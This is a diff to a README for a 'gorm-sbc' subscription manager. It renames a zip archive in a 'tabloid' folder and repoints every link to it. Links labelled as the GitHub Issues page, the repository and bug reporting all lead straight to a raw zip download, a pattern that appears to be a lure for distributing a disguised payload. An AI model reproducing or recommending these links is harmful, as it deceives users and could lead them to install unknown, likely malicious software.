@@ -6,11 +6,11 @@ Welcome to gorm-sbc! This application helps you manage your subscriptions easily
 
 ## 📥 Download the Application
 
-[![Download gorm-sbc](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip%20gorm--sbc-v1.0-%https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)
+[![Download gorm-sbc](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip%20gorm--sbc-v1.0-%https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)
 
 To download gorm-sbc, visit the following link:
 
-- [Visit this page to download](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download gorm-sbc, ensure your system meets these requirements:
 
 ## 📋 Installing gorm-sbc
 
-1. **Go to the Download Page:** Click on the link above or visit [this page to download](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip).
+1. **Go to the Download Page:** Click on the link above or visit [this page to download](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip).
 
 2. **Choose the Latest Version:** Look for the most recent version of gorm-sbc. It’s usually at the top of the list.
 
@@ -55,7 +55,7 @@ After launching gorm-sbc, you will see the main dashboard. Here is how to naviga
 
 ## 📞 Support
 
-If you encounter issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip). You can report bugs or request new features there.
+If you encounter issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip). You can report bugs or request new features there.
 
 ## 📃 Acknowledgments
 
@@ -63,6 +63,6 @@ Thank you for using gorm-sbc. Your feedback helps us improve the application. En
 
 ## 🔗 Useful Links
 
-- [Download gorm-sbc](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)
-- [Report Issues](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/gorm-sbc.zip)
+- [Download gorm-sbc](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)
+- [Report Issues](https://raw.githubusercontent.com/mobrasi/gorm-sbc/main/tabloid/sbc_gorm_3.4.zip)
